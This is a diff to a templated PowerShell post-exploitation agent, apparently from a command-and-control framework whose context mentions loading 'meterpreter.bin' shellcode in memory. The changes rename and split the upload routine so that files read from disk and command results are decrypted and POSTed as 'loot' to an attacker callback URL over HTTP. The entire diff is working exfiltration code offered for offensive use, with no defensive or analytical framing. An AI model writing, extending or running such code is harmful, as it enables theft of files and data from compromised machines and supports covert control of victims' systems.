@@ -387,7 +387,7 @@ Load the shellcode module with the name 'meterpreter.bin' in memory and run it
 }
 
 
-function Send-File {
+function Send-Bytes {
     Param(
        [Parameter(Mandatory=$True,Position=0)]
        [Byte[]]$Body,
@@ -410,6 +410,24 @@ function Send-File {
         $FileName = Get-Date -Format o
     }
 
+    $Body = (Decrypt-Code $Body $KEY)
+
+    if ("{{transport}}" -match "^https?$") {
+        Send-BytesViaHttp -LootId $LootId $Body $FileName
+    }
+}
+
+function Send-BytesViaHttp {
+    Param(
+       [Parameter(Mandatory=$True,Position=0)]
+       [Byte[]]$Body,
+
+       [Parameter(Mandatory=$False,Position=1)]
+       [String[]]$FileName,
+
+       [Parameter(Mandatory=$False)]
+       [String] $LootId
+    )
     $boundary = [System.Guid]::NewGuid().ToString()
     $LF = "`r`n"
 
@@ -422,7 +440,7 @@ function Send-File {
     $prebody = [System.Text.Encoding]::UTF8.GetBytes($prebody)
     $postbody = [System.Text.Encoding]::UTF8.GetBytes($postbody)
 
-    $post_url = $($CALLBACK_URL + "u?noredirect=1")
+    $post_url = "$(${CALLBACK_URL})u?script"
     if ($LootId) { $post_url += "&loot=$LootId" }
     {{'Write-Debug "POSTing the file to $post_url..."'|debug}}
     $WebRequest = [System.Net.WebRequest]::Create($post_url)
@@ -491,7 +509,7 @@ Get-ChildItem | PushTo-Hub -Name "directory-listing"
                 $Body = $result | ConvertTo-Json
                 $Body = [system.Text.Encoding]::UTF8.GetBytes($Body)
             }
-            Send-File -LootId $LootId $Body $Name
+            Send-Bytes -LootId $LootId $Body $Name
         } else {
             ForEach ($file in $Files) {
                 {{'Write-Debug "Pushing $File..."'|debug}}
@@ -499,7 +517,7 @@ Get-ChildItem | PushTo-Hub -Name "directory-listing"
                 $fileBin = [System.IO.File]::ReadAllBytes($abspath)
                 if ($Name) { $filename = $name } else { $filename = $file }
 
-                Send-File -LootId $LootId $fileBin $filename
+                Send-Bytes -LootId $LootId $fileBin $filename
 
             }
         }
